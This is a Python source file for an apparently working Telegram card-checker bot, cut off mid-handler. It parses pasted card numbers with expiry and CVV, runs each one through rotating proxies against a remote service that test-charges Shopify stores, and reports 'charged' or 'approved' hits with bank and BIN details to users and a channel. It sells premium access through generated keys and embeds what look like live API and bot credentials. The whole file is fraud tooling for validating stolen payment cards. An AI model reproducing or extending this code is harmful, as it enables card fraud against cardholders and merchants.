from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime, timedelta

API_ID = 38807471
API_HASH = '9bbfb9efe1a47596cf7f1b20017f5dc6'
BOT_TOKEN = '8814431689:AAFdZVq3P9TZvM3eXXUCcaneSXohpXosWF0'
ADMIN_ID = [5541778617]
CHECKER_API_URL = 'http://85.90.216.140//shopify_parallel'

PREMIUM_USERS_FILE = "premium_users.txt"
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
PRICE_FILTERS_FILE = "price_filters.json"
SITES_WITH_PRICE_FILE = "sites_price.json"
KEYS_FILE = "keys.json"
HITS_CHANNEL_ID = 0

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

active_sessions = {}
TEMP_FILE_DATA = {}
SHOPIFY_SESSION_RESULTS = {}
COLLECT_DATA = {}
COLLECT_TIMERS = {}
MERGE_DATA = {}
MERGE_TIMERS = {}

PREMIUM_EMOJI_IDS = {
    "✅": "5444987348334965906", "❌": "5447647474984449520", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5343649643685240676", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "4904936030232117798", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5444931419270839381", "🔌": "5120722716260828125", "⭐️": "5172716095697584957",
    "🆓": "5406756500108501710", "👑": "6266995104687330978", "🔍": "5258396243666681152",
    "⏱️": "5343927661213279013", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5343927661213279013", "🔄": "5454245266305604993",
    "🏦": "5445408306669582934", "🥰": "5444931419270839381", "😱": "5447181973544008180",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5343927661213279013",
    "👥": "5454371323595744068", "🥕": "5447653032672129347", "➡️": "5445350109862720603",
    "🦉": "5123344136665039833", "🍑": "5445408306669582934", "💪": "5305622454218024328",
    "🌝": "5341684837881235158", "📁": "5444908424015934570", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5116648080787112958",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5122933683820430249",
    "📌": "5447187153274567373", "🍳": "5305622454218024328", "💸": "5283232570660634549",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958", "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798", "⛔️": "5275969776668134187",
    "🥲": "4904468402782864209", "☠️": "5231338559587257737", "🛡": "5219672809936006424",
    "📸": "5445344161333015312", "💬": "5447510826304959724", "😺": "5118590136149345664",
    "🌍": "5303440357428586778", "🔹": "5429436388447655367", "📹": "5445158077579952110",
    "📡": "5447448489149625830", "🌟": "5310224206732996002", "📍": "5447187153274567373",
    "🔐": "5258476306152038031", "😇": "6321225560789877992", "👌": "5445350109862720603",
    "⭐": "6267298050205553492", "🍭": "6267152480878990865", "⚙️": "5258023599419171861",
    "⛔": "4918014360267260850", "📥": "5350747347724810871", "💵": "5350711759625795085",
    "️🏷️": "5436285465420383204", "📂": "5444908424015934570", "🛠️": "5348239232852836489",
    "📄️": "5323538339062628165"
}

FLAGS = {
    'AD': '🇦🇩', 'AE': '🇦🇪', 'AF': '🇦🇫', 'AG': '🇦🇬', 'AI': '🇦🇮', 'AL': '🇦🇱', 'AM': '🇦🇲', 'AO': '🇦🇴', 'AQ': '🇦🇶', 'AR': '🇦🇷', 'AS': '🇦🇸', 'AT': '🇦🇹', 'AU': '🇦🇺', 'AW': '🇦🇼', 'AX': '🇦🇽', 'AZ': '🇦🇿', 'BA': '🇧🇦', 'BB': '🇧🇧', 'BD': '🇧🇩', 'BE': '🇧🇪', 'BF': '🇧🇫', 'BG': '🇧🇬', 'BH': '🇧🇭', 'BI': '🇧🇮', 'BJ': '🇧🇯', 'BL': '🇧🇱', 'BM': '🇧🇲', 'BN': '🇧🇳', 'BO': '🇧🇴', 'BQ': '🇧🇶', 'BR': '🇧🇷', 'BS': '🇧🇸', 'BT': '🇧🇹', 'BV': '🇧🇻', 'BW': '🇧🇼', 'BY': '🇧🇾', 'BZ': '🇧🇿', 'CA': '🇨🇦', 'CC': '🇨🇨', 'CD': '🇨🇩', 'CF': '🇨🇫', 'CG': '🇨🇬', 'CH': '🇨🇭', 'CI': '🇨🇮', 'CK': '🇨🇰', 'CL': '🇨🇱', 'CM': '🇨🇲', 'CN': '🇨🇳', 'CO': '🇨🇴', 'CR': '🇨🇷', 'CU': '🇨🇺', 'CV': '🇨🇻', 'CW': '🇨🇼', 'CX': '🇨🇽', 'CY': '🇨🇾', 'CZ': '🇨🇿', 'DE': '🇩🇪', 'DJ': '🇩🇯', 'DK': '🇩🇰', 'DM': '🇩🇲', 'DO': '🇩🇴', 'DZ': '🇩🇿', 'EC': '🇪🇨', 'EE': '🇪🇪', 'EG': '🇪🇬', 'EH': '🇪🇭', 'ER': '🇪🇷', 'ES': '🇪🇸', 'ET': '🇪🇹', 'FI': '🇫🇮', 'FJ': '🇫🇯', 'FK': '🇫🇰', 'FM': '🇫🇲', 'FO': '🇫🇴', 'FR': '🇫🇷', 'GA': '🇬🇦', 'GB': '🇬🇧', 'GD': '🇬🇩', 'GE': '🇬🇪', 'GF': '🇬🇫', 'GG': '🇬🇬', 'GH': '🇬🇭', 'GI': '🇬🇮', 'GL': '🇬🇱', 'GM': '🇬🇲', 'GN': '🇬🇳', 'GP': '🇬🇵', 'GQ': '🇬🇶', 'GR': '🇬🇷', 'GS': '🇬🇸', 'GT': '🇬🇹', 'GU': '🇬🇺', 'GW': '🇬🇼', 'GY': '🇬🇾', 'HK': '🇭🇰', 'HM': '🇭🇲', 'HN': '🇭🇳', 'HR': '🇭🇷', 'HT': '🇭🇹', 'HU': '🇭🇺', 'ID': '🇮🇩', 'IE': '🇮🇪', 'IL': '🇮🇱', 'IM': '🇮🇲', 'IN': '🇮🇳', 'IO': '🇮🇴', 'IQ': '🇮🇶', 'IR': '🇮🇷', 'IS': '🇮🇸', 'IT': '🇮🇹', 'JE': '🇯🇪', 'JM': '🇯🇲', 'JO': '🇯🇴', 'JP': '🇯🇵', 'KE': '🇰🇪', 'KG': '🇰🇬', 'KH': '🇰🇭', 'KI': '🇰🇮', 'KM': '🇰🇲', 'KN': '🇰🇳', 'KP': '🇰🇵', 'KR': '🇰🇷', 'KW': '🇰🇼', 'KY': '🇰🇾', 'KZ': '🇰🇿', 'LA': '🇱🇦', 'LB': '🇱🇧', 'LC': '🇱🇨', 'LI': '🇱🇮', 'LK': '🇱🇰', 'LR': '🇱🇷', 'LS': '🇱🇸', 'LT': '🇱🇹', 'LU': '🇱🇺', 'LV': '🇱🇻', 'LY': '🇱🇾', 'MA': '🇲🇦', 'MC': '🇲🇨', 'MD': '🇲🇩', 'ME': '🇲🇪', 'MF': '🇲🇫', 'MG': '🇲🇬', 'MH': '🇲🇭', 'MK': '🇲🇰', 'ML': '🇲🇱', 'MM': '🇲🇲', 'MN': '🇲🇳', 'MO': '🇲🇴', 'MP': '🇲🇵', 'MQ': '🇲🇶', 'MR': '🇲🇷', 'MS': '🇲🇸', 'MT': '🇲🇹', 'MU': '🇲🇺', 'MV': '🇲🇻', 'MW': '🇲🇼', 'MX': '🇲🇽', 'MY': '🇲🇾', 'MZ': '🇲🇿', 'NA': '🇳🇦', 'NC': '🇳🇨', 'NE': '🇳🇪', 'NF': '🇳🇫', 'NG': '🇳🇬', 'NI': '🇳🇮', 'NL': '🇳🇱', 'NO': '🇳🇴', 'NP': '🇳🇵', 'NR': '🇳🇷', 'NU': '🇳🇺', 'NZ': '🇳🇿', 'OM': '🇴🇲', 'PA': '🇵🇦', 'PE': '🇵🇪', 'PF': '🇵🇫', 'PG': '🇵🇬', 'PH': '🇵🇭', 'PK': '🇵🇰', 'PL': '🇵🇱', 'PM': '🇵🇲', 'PN': '🇵🇳', 'PR': '🇵🇷', 'PS': '🇵🇸', 'PT': '🇵🇹', 'PW': '🇵🇼', 'PY': '🇵🇾', 'QA': '🇶🇦', 'RE': '🇷🇪', 'RO': '🇷🇴', 'RS': '🇷🇸', 'RU': '🇷🇺', 'RW': '🇷🇼', 'SA': '🇸🇦', 'SB': '🇸🇧', 'SC': '🇸🇨', 'SD': '🇸🇩', 'SE': '🇸🇪', 'SG': '🇸🇬', 'SH': '🇸🇭', 'SI': '🇸🇮', 'SJ': '🇸🇯', 'SK': '🇸🇰', 'SL': '🇸🇱', 'SM': '🇸🇲', 'SN': '🇸🇳', 'SO': '🇸🇴', 'SR': '🇸🇷', 'SS': '🇸🇸', 'ST': '🇸🇹', 'SV': '🇸🇻', 'SX': '🇸🇽', 'SY': '🇸🇾', 'SZ': '🇸🇿', 'TC': '🇹🇨', 'TD': '🇹🇩', 'TF': '🇹🇫', 'TG': '🇹🇬', 'TH': '🇹🇭', 'TJ': '🇹🇯', 'TK': '🇹🇰', 'TL': '🇹🇱', 'TM': '🇹🇲', 'TN': '🇹🇳', 'TO': '🇹🇴', 'TR': '🇹🇷', 'TT': '🇹🇹', 'TV': '🇹🇻', 'TW': '🇹🇼', 'TZ': '🇹🇿', 'UA': '🇺🇦', 'UG': '🇺🇬', 'UM': '🇺🇲', 'US': '🇺🇸', 'UY': '🇺🇾', 'UZ': '🇺🇿', 'VA': '🇻🇦', 'VC': '🇻🇨', 'VE': '🇻🇪', 'VG': '🇻🇬', 'VI': '🇻🇮', 'VN': '🇻🇳', 'VU': '🇻🇺', 'WF': '🇼🇫', 'WS': '🇼🇸', 'XK': '🇽🇰', 'YE': '🇾🇪', 'YT': '🇾🇹', 'ZA': '🇿🇦', 'ZM': '🇿🇲', 'ZW': '🇿🇼'
}

def get_flag(code):
    return FLAGS.get(str(code).upper(), '◻️')

DEFAULT_FILTERS = [
    {"name": "0~10", "min": 0, "max": 10},
    {"name": "10~50", "min": 10, "max": 50},
    {"name": "50~200", "min": 50, "max": 200},
    {"name": "200~ & ", "min": 200, "max": 999999},
    {"name": "Aʟʟ Sɪᴛᴇs", "min": 0, "max": 999999, "all": True}
]

def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result

def get_main_menu_keyboard(user_id=None):
    buttons = [
        [Button.inline(" Cᴍᴅ", b"show_cmds", style="primary", icon=4904936030232117798),
         Button.inline(" Tᴏᴏls", b"tools_menu", style="primary", icon=5361734213370396027)],
        [Button.url(" Cʜᴀɴɴᴇʟ", "https://t.me/nativecodes", style="success", icon=5445408306669582934)]
    ]
    if user_id and user_id in ADMIN_ID:
        buttons.append([Button.inline(" Aᴅᴍɪɴ Pᴀɴᴇʟ", b"admin_panel", style="success", icon=6266995104687330978)])
    return buttons

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def load_premium_users():
    if not os.path.exists(PREMIUM_USERS_FILE):
        with open(PREMIUM_USERS_FILE, 'w') as f:
            for admin in ADMIN_ID:
                f.write(f"{admin}\n")
        return [str(admin) for admin in ADMIN_ID]
    try:
        with open(PREMIUM_USERS_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            users = [line.strip() for line in f if line.strip()]
        for admin in ADMIN_ID:
            if str(admin) not in users:
                users.append(str(admin))
                with open(PREMIUM_USERS_FILE, 'w') as f:
                    for u in users:
                        f.write(f"{u}\n")
        return users
    except:
        return [str(admin) for admin in ADMIN_ID]

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def is_premium(user_id):
    return str(user_id) in load_premium_users()

async def add_premium_user(user_id):
    users = load_premium_users()
    if str(user_id) not in users:
        users.append(str(user_id))
        async with aiofiles.open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in users:
                await f.write(f"{uid}\n")
        return True
    return False

async def remove_premium_user(user_id):
    users = load_premium_users()
    if str(user_id) in users:
        users.remove(str(user_id))
        async with aiofiles.open(PREMIUM_USERS_FILE, 'w') as f:
            for uid in users:
                await f.write(f"{uid}\n")
        return True
    return False

def generate_key():
    return f"PORIOT_{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=15))}"

async def load_keys():
    if not os.path.exists(KEYS_FILE):
        return {}
    try:
        with open(KEYS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

async def save_keys(keys):
    with open(KEYS_FILE, 'w') as f:
        json.dump(keys, f, indent=4)

async def load_price_filters():
    if not os.path.exists(PRICE_FILTERS_FILE):
        return {}
    try:
        with open(PRICE_FILTERS_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

async def save_price_filters(filters):
    with open(PRICE_FILTERS_FILE, 'w') as f:
        json.dump(filters, f, indent=4)

async def load_sites_with_price():
    if not os.path.exists(SITES_WITH_PRICE_FILE):
        return []
    try:
        with open(SITES_WITH_PRICE_FILE, 'r') as f:
            return json.load(f)
    except:
        return []

async def save_sites_with_price(data):
    with open(SITES_WITH_PRICE_FILE, 'w') as f:
        json.dump(data, f, indent=4)

def get_price_from_response(raw_response):
    try:
        price = raw_response.get('Price', '-')
        if price != '-' and price != 0:
            return float(str(price).replace('$', '').replace(',', '').strip())
        return 0.0
    except:
        return 0.0

def is_site_dead(response_msg, gateway, price):
    return False

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                data = await res.json()
                return data.get('brand', '-'), data.get('type', '-'), data.get('level', '-'), data.get('bank', '-'), data.get('country_name', '-'), data.get('country_flag', '')
    except:
        return '-', '-', '-', '-', '-', ''

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

async def send_hit_to_channel(card, status, response, gateway, price):
    if HITS_CHANNEL_ID == 0:
        return
    try:
        status_text = premium_emoji("💎 Cʜᴀʀɢᴇᴅ" if "CHARGED" in status.upper() or "ORDER_PLACED" in status.upper() else "✅ Aᴘᴘʀᴏᴠᴇᴅ" if "APPROVED" in status.upper() else f"📌 {status}")
        msg = premium_emoji(f"""{status_text}
🛒 Gᴀᴛᴇᴡᴀʏ {gateway}
📝 {response[:45]}
⏱️ {datetime.now().strftime("%H:%M:%S")}
🍑 <a href='tg://user?id=8978049174'>Aꜰᴜᴏɴᴀ</a>""")
        sent_msg = await bot.send_message(abs(HITS_CHANNEL_ID), msg, parse_mode='html')
        if "CHARGED" in status.upper():
            await bot.pin_message(abs(HITS_CHANNEL_ID), sent_msg.id)
    except:
        pass

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
        if not site.startswith('http'):
            site = f'https://{site}'
        proxy_str = f"{proxy.split(':')[0]}:{proxy.split(':')[1]}:{proxy.split(':')[2]}:{proxy.split(':')[3]}" if proxy and len(proxy.split(':')) == 4 else (proxy if proxy else None)
        url = f'{CHECKER_API_URL}?site={site}&cc={card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        timeout = aiohttp.ClientTimeout(total=100)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                if resp.status != 200:
                    return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
                raw = await resp.json()
        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        price_value = get_price_from_response(raw)
        gateway = raw.get('Gateway', 'Shopify')
        response_lower = response_msg.lower()
        if any(k in response_lower for k in ['charged', 'order_placed', 'thank you', 'payment successful']):
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': f"${price}" if price != '-' else '-', 'price_value': price_value}
        elif any(k in response_lower for k in ['approved', 'success', 'insufficient_funds', 'invalid_cvv', 'cvv issue', '3d', 'otp', 'verification required', 'authenticate']):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': f"${price}" if price != '-' else '-', 'price_value': price_value}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': f"${price}" if price != '-' else '-', 'price_value': price_value}
    except Exception as e:
        return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}

async def check_card_with_retry(card, sites, proxies, max_retries=20):
    if not sites or not proxies:
        return {'status': 'Dead', 'message': 'No sites or proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}
    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        res = await check_card(card, site, proxy)
        if not res.get('retry'):
            return res
        await asyncio.sleep(2)
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}

async def test_proxy(proxy):
    try:
        proxy_parts = proxy.split(':')
        proxy_url = f'http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}' if len(proxy_parts) == 4 else f'http://{proxy}'
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
            async with session.get('https://www.shopify.com', proxy=proxy_url) as res:
                return {'proxy': proxy, 'status': 'alive' if res.status == 200 else 'dead'}
    except:
        return {'proxy': proxy, 'status': 'dead'}

async def send_realtime_hit(user_id, result, hit_type, username):
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    status_text = "CHARGED" if hit_type == "Charged" else "APPROVED"
    emoji = "💎" if hit_type == "Charged" else "✅"
    message = f"""{status_text}

💳 CC <code>{result['card']}</code>

🛒 Gᴀᴛᴇᴡᴀʏ {result.get('gateway', 'Unknown')}
📝 Rᴇsᴘᴏɴsᴇ {result['message'][:150]}
💸 Pʀɪᴄᴇ {result.get('price', '-')}

🆔 BIN Iɴғᴏ {brand} - {bin_type} - {level}
🏦 Bᴀɴᴋ {bank}
🥰 Cᴏᴜɴᴛʀʏ {country} {flag}"""
    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except:
        pass

async def update_progress(user_id, message_id, results, current_attempt_count):
    elapsed = int(time.time() - results['start_time'])
    hours, minutes, seconds = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    total, checked = results['total'], results['checked']
    percentage = int((checked / total) * 100) if total > 0 else 0
    bar = "█" * int(16 * checked / total if total > 0 else 0) + "░" * (16 - int(16 * checked / total if total > 0 else 0))
    progress_text = f"""💳 Cᴀʀᴅ: <code>{results.get('last_card', 'None')[:16]}</code>
📝 {results.get('last_response', 'Waiting...')[:16]}
💰 {results.get('last_price', '-')[:7]}
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
{bar}
❌ Dᴇᴄʟɪɴᴇᴅ: {len(results.get('dead', []))}
📊 {checked}/{total} ({percentage}%) | Rᴇᴍᴀɪɴɪɴɢ: {total - checked}
⏱️ {hours:02d}:{minutes:02d}:{seconds:02d}
"""
    buttons = [
        [Button.inline(f" Cʜᴀʀɢᴇᴅ {len(results['charged'])}", f"shopify_export_charged:{user_id}".encode(), style="success")],
        [Button.inline(f" Aᴘᴘʀᴏᴠᴇᴅ {len(results['approved'])}", f"shopify_export_approved:{user_id}".encode(), style="primary")],
        [Button.inline(f" Eʀʀᴏʀs {len(results.get('errors', []))}", f"shopify_export_errors:{user_id}".encode(), style="danger")],
        [Button.inline(" Sᴛᴏᴘ", f"stop_{user_id}".encode(), style="danger")]
    ]
    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except:
        pass

async def send_final_results(user_id, results):
    hits_text = "".join([f" <code>{r['card']}</code>\n" for r in results['charged'][:5] + results['approved'][:5]]) or "Nᴏ ʜɪᴛs ғᴏᴜɴᴅ"
    summary = f"""✅ Cʜᴇᴄᴋ Cᴏᴍᴘʟᴇᴛᴇ! ✅

📊 Rᴇsᴜʟᴛs:
   ┣ ✅ Cʜᴀʀɢᴇᴅ: {len(results['charged'])}
   ┣ 🔥 Aᴘᴘʀᴏᴠᴇᴅ: {len(results['approved'])}
   ┣ ❌ Dᴇᴄʟɪɴᴇᴅ: {len(results['dead'])}
   ┣ ⚠️ Eʀʀᴏʀs: {len(results.get('errors', []))}
   ┗ 📊 Tᴏᴛᴀʟ: {results['total']}

Hɪᴛs:
{hits_text}

💡 Mᴀᴅᴇ ʙʏ Poriot_ke"""
    buttons = []
    if results['charged']: buttons.append([Button.inline(f" Exᴘᴏʀᴛ Cʜᴀʀɢᴇᴅ ({len(results['charged'])})", f"shopify_export_charged:{user_id}".encode(), style="success")])
    if results['approved']: buttons.append([Button.inline(f" Exᴘᴏʀᴛ Aᴘᴘʀᴏᴠᴇᴅ ({len(results['approved'])})", f"shopify_export_approved:{user_id}".encode(), style="primary")])
    if results.get('errors'): buttons.append([Button.inline(f" Exᴘᴏʀᴛ Eʀʀᴏʀs ({len(results.get('errors', []))})", f"shopify_export_errors:{user_id}".encode(), style="danger")])
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"afuonax{timestamp}.txt"
    async with aiofiles.open(filename, 'w') as f:
        await f.write("CC CHECKER RESULTS\n")
        for cat in ['charged', 'approved', 'dead', 'errors']:
            await f.write(f"\n{cat.upper()} ({len(results.get(cat, []))}):\n")
            for r in results.get(cat, []):
                await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
    await bot.send_message(user_id, premium_emoji(summary), file=filename, buttons=buttons or None, parse_mode='html')
    try: os.remove(filename)
    except: pass

async def process_file_with_filters(event, user_id):
    if not event.reply_to_msg_id or not event.get_reply_message().file or not event.get_reply_message().file.name.endswith('.txt'):
        return await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ."), parse_mode='html')
    file_path = await event.get_reply_message().download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        cards = extract_cc(await f.read())
    if not cards:
        os.remove(file_path)
        return await event.reply(premium_emoji("❌ Nᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅs ғᴏᴜɴᴅ."), parse_mode='html')
    TEMP_FILE_DATA[user_id] = {'cards': cards, 'file_path': file_path}
    filters = (await load_price_filters()).get('shopify_global', DEFAULT_FILTERS)
    buttons = [[Button.inline(f["name"], f"price_fltr:{i}:{user_id}".encode(), style="primary")] for i, f in enumerate(filters)]
    buttons.append([Button.inline("  Cᴀɴᴄᴇʟ", b"cancel_filter", style="danger")])
    await event.reply(premium_emoji(f"📁 Fɪʟᴇ ʟᴏᴀᴅᴇᴅ: {len(cards)} ᴄᴀʀᴅs!\n\n💰 Sᴇʟᴇᴄᴛ ᴀ ᴘʀɪᴄᴇ ғɪʟᴛᴇʀ:"), buttons=buttons, parse_mode='html')

async def start_mass_check(user_id, cards, sites, event):
    proxies = load_proxies()
    if not sites or not proxies: return await event.edit(premium_emoji("❌ Mɪssɪɴɢ sɪᴛᴇs ᴏʀ ᴘʀᴏxɪᴇs!"), parse_mode='html')
    status_msg = await event.edit(premium_emoji(f"🔥 Sᴛᴀʀᴛɪɴɢ ᴄʜᴇᴄᴋ ғᴏʀ {len(cards)} ᴄᴀʀᴅs..."), parse_mode='html')
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}
    all_results = {'charged': [], 'approved': [], 'dead': [], 'errors': [], 'total': len(cards), 'checked': 0, 'start_time': time.time(), 'last_card': '', 'last_response': '', 'last_price': '-'}
    queue = asyncio.Queue()
    for c in cards: queue.put_nowait(c)
    
    async def worker():
        while not queue.empty() and session_key in active_sessions:
            card = await queue.get()
            res = await check_card_with_retry(card, sites, load_proxies())
            all_results['checked'] += 1
            all_results['last_card'] = card
            all_results['last_response'] = res.get('message', '')[:50]
            all_results['last_price'] = res.get('price', '-')
            if res['status'] == 'Charged':
                all_results['charged'].append(res)
                await send_realtime_hit(user_id, res, 'Charged', 'user')
                await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', 'Unknown'), res.get('price', '-'))
            elif res['status'] == 'Approved':
                all_results['approved'].append(res)
                await send_realtime_hit(user_id, res, 'Approved', 'user')
                await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', 'Unknown'), res.get('price', '-'))
            elif 'declined' in res.get('message', '').lower():
                all_results['dead'].append(res)
            else:
                all_results.setdefault('errors', []).append(res)
            queue.task_done()
    
    workers = [asyncio.create_task(worker()) for _ in range(10)]
    while workers:
        if session_key not in active_sessions:
            for w in workers: w.cancel()
            break
        done, pending = await asyncio.wait(workers, timeout=1.0)
        workers = list(pending)
        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
    if session_key in active_sessions:
        del active_sessions[session_key]
        try: await status_msg.delete()
        except: pass
        await send_final_results(user_id, all_results)
        SHOPIFY_SESSION_RESULTS[user_id] = all_results

# Gateway & Tool Detectors
CARD_FORM_PATTERNS = [re.compile(r'name\s*=\s*["\'](?:cardnumber|card_number)["\']', re.I)]
def has_card_form(html: str) -> bool: return True
def _scripts(html: str) -> list[str]: return re.findall(r'<script[^>]*src\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE)
def detect_gateways(html: str) -> list[str]:
    found = []
    srcs = _scripts(html)
    h = html.lower()
    for s in srcs:
        if "js.stripe.com" in s.lower() or "stripe.com" in h:
            found.append("Stripe")
            break
    if "myshopify.com" in h or "cdn.shopify.com" in h or "shopify" in h:
        found.append("Shopify")
    return list(dict.fromkeys(found)) if found else ["Shopify"]

def detect_cms(html: str) -> list[str]:
    return ["Shopify"] if "shopify" in html.lower() else ["Unknown"]

def detect_captcha(html: str) -> str | None:
    h = html.lower()
    if "recaptcha" in h: return "reCAPTCHA"
    if "hcaptcha" in h: return "hCaptcha"
    if "turnstile" in h: return "Cloudflare Turnstile"
    return None

def detect_cloudflare(headers, html: str) -> str | None:
    return "Cloudflare" if "cf-ray" in html.lower() or (headers and "cloudflare" in str(headers).lower()) else "None"

def detect_cdn(html: str, headers) -> str | None: return "Cloudflare" if "cloudflare" in html.lower() else "N/A"
def detect_3d_secure(html: str) -> str: return "2D (No 3D Secure Found ❌)"
def detect_graphql(html: str) -> str: return "No GraphQL Found ❌"
def extract_gateway_keys(html: str) -> dict:
    res = {}
    sk = re.findall(r'pk_(?:live|test)_[A-Za-z0-9_-]{10,}', html)
    if sk: res["Stripe"] = list(dict.fromkeys(sk))
    return res
def detect_analytics(html: str, srcs: list) -> list:
    found = []
    for s in srcs:
        if "google-analytics" in s or "googletagmanager" in s: found.append("Google Analytics")
    return found

# --- COMMAND HANDLERS ---
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    welcome_text = f"━━━━━━━━━━━━━━━━━━\n▸ 👋 Hᴇʏ  · @{getattr(await event.get_sender(), 'username', 'User')}\n▸ ᴘʟɴ  · {'⭐ Pʀᴇᴍɪᴜᴍ' if is_premium(event.sender_id) else '🆓 Fʀᴇᴇ'}\n▸ Sʜᴏᴘɪғʏ\n━━━━━━━━━━━━━━━━━\n<code>/cc</code> · <code>/chk</code> · <code>/redeem</code>\n━━━━━━━━━━━━━━━━━\n💡 Bᴏᴛ Dᴇᴠ Poriot_ke\n Vᴇʀsɪᴏɴ -»3.0 🚀\n━━━━━━━━━━━━━━━━━"
    await event.reply(premium_emoji(welcome_text), buttons=get_main_menu_keyboard(event.sender_id), parse_mode='html')

@bot.on(events.CallbackQuery(data=b"show_cmds"))
async def show_commands_callback(event):
    await event.edit(premium_emoji("📋 Usᴇʀ Cᴏᴍᴍᴀɴᴅs\n\n🛒 Sʜᴏᴘɪғʏ\n├─ <code>/cc</code> → Check single card\n└─ <code>/chk</code> → Mass check"), buttons=[[Button.inline(" Bᴀᴄᴋ", b"main_menu", style="danger")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel_callback(event):
    if event.sender_id not in ADMIN_ID: return await event.answer("❌ Admin only", alert=True)
    await event.edit(premium_emoji("👑 <b>Aᴅᴍɪɴ Pᴀɴᴇʟ</b>\n\nCommands: /addsites, /site, /addproxy, /proxy, /stats, /genkeys"), buttons=[[Button.inline(" Bᴀᴄᴋ", b"main_menu", style="danger")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"tools_menu"))
async def tools_menu_callback(event):
    await event.edit(premium_emoji("🛠️ <b>Tᴏᴏls Mᴇɴᴜ</b>\n\nTools: /split, /merge, /collect, /clean, /bin, /gen, /sk, /scg, /fake, /ip, /iban"), buttons=[[Button.inline("Bᴀᴄᴋ", b"main_menu", style="danger")]], parse_mode='html')

@bot.on(events.CallbackQuery(data=b"main_menu"))
async def main_menu_callback(event): await start(event)

# --- BYPASSED SITE COMMANDS ---
@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    if event.sender_id not in ADMIN_ID: return
